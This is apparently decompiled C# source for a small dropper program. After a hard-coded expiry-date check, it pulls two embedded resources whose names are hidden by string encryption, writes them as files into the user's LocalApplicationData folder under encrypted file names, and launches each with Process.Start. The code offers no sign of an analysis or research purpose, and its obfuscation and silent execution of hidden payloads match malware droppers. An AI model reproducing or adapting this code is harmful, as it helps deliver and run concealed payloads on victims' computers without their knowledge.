using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

internal static class Class0
{
	private static void Main()
	{
		if (DateTime.Now > new DateTime(635555064086747444L))
		{
			throw new Exception();
		}
		try
		{
			ResourceManager resourceManager = new ResourceManager(Class1.smethod_0("\ue4bd\ue4b2\ue4b7\ue4be\ue4a8", 58523), Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class1.smethod_0("\uf597\uf594\uf5b2\uf59d\uf589\uf59e\uf5a8\uf5b8\uf58e\uf5be\uf5f1\uf5ba\uf5a7\uf5ba", 62942), (byte[])resourceManager.GetObject(Class1.smethod_0("\uf782\uf780\uf789\uf783\uf7a9\uf798\uf7ae\uf785\uf7b0\uf78e", 63247)));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class1.smethod_0("\uf597\uf594\uf5b2\uf59d\uf589\uf59e\uf5a8\uf5b8\uf58e\uf5be\uf5f1\uf5ba\uf5a7\uf5ba", 62942));
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class1.smethod_0("\ue704\ue728\ue73d\ue733\ue738\ue735\ue70f\ue702\ue735\ue722\ue759\ue759\ue71d\ue707\ue710", 59204), (byte[])resourceManager.GetObject(Class1.smethod_0("\ue90e\ue904\ue923\ue926\ue919\ue928\ue91d\ue91f\ue926\ue93a", 59722)));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class1.smethod_0("\ue704\ue728\ue73d\ue733\ue738\ue735\ue70f\ue702\ue735\ue722\ue759\ue759\ue71d\ue707\ue710", 59204));
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
